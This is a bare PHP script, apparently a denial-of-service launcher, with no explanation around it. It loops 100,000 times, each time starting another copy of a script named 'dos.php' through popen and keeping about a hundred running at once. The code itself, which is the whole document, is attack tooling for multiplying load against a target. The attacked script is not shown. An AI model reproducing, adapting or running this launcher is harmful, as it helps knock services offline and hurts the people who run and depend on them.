<?php



        $go = 0;
        $j = 0;
        $i = 0;
        $t = 100;
        $z = 0;
        while ($z < 100000){
                $z++;
                echo ($j-$i)."\n";
                @$pipe[$j] = popen('php dos.php', 'w');
//              sleep(1);
                $j++;
                if ($j-$i>=$t){
                        @pclose($pipe[$i]);
                        $i++;
                }

        }

?>
